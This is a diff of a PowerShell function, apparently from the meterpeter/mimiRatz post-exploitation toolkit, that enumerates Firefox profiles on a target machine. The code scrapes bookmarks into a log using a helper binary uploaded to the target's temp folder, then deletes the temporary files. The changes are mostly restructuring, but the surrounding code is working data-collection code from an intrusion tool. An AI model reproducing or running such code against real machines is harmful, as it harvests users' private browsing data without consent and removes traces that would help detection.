@@ -330,8 +330,8 @@ function FIREFOX {
     ## Retrieve FireFox Browser Information
     echo "`n`nFireFox Browser" >> $LogFilePath\BrowserEnum.log
     echo "---------------" >> $LogFilePath\BrowserEnum.log
-    $FirefoxProfile = Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles";
-    If($FirefoxProfile -eq $True){
+    ## Set the Location of firefox prefs.js file
+    If(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles"){
         If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\prefs.js")){
             $FirefoxProfile = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\prefs.js"
             $stupidTrick = $True
@@ -513,7 +513,9 @@ function FIREFOX {
                 Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue
                 Remove-Item -Path "$env:tmp\mozlz4-win64.exe" -Force -ErrorAction SilentlyContinue
             }
+
         }else{
+
             If(-not(Test-Path "$env:tmp\mozlz4-win32.exe")){
                 $fail = $True
                 echo "{Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
@@ -534,7 +536,8 @@ function FIREFOX {
             cd $IPATH
         }
 
-        ## TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
+        ## mozlz4-win32.exe , mozlz4-win64.exe Fail dependencie bypass
+        # TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
         # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..
         If($fail -eq $True){
             $Json = Get-Content "$Bookmarks_Path" -Raw
@@ -542,10 +545,10 @@ function FIREFOX {
                 ForEach ($Key in $Regex){
                     echo "`n" $Key >> $LogFilePath\BrowserEnum.log
                 }
-            }
         }
-        cd $IPATH
-        If(Test-Path "$env:tmp\output.jsonlz4"){Remove-Item -Path "$env:tmp\output.jsonlz4" -Force}
+    }
+    cd $IPATH
+    If(Test-Path "$env:tmp\output.jsonlz4"){Remove-Item -Path "$env:tmp\output.jsonlz4" -Force}
 }
 
 
